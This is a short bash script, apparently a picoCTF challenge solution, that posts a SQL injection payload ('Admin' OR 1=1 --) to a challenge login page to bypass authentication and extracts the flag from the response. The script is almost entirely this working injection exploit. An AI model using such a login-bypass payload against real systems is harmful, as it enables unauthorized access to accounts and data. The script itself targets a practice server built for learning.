#!/bin/bash
#get flag script 2023:07:07
#Creator 0xtheM7
curl -X POST http://jupiter.challenges.picoctf.org:33850/login.php -d "username=Admin%27+OR+1%3D1+--&password=123&debug=0" --silent | cut -d ":" -f2 | cut -d "<" -f1 | cut -d " " -f2 
